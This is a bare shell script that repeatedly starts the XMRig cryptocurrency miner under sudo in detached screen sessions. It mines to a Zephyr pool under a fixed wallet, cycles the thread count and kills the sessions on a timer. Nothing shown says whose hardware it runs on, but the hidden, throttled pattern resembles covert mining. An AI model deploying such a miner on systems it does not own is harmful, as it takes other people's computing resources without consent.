screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
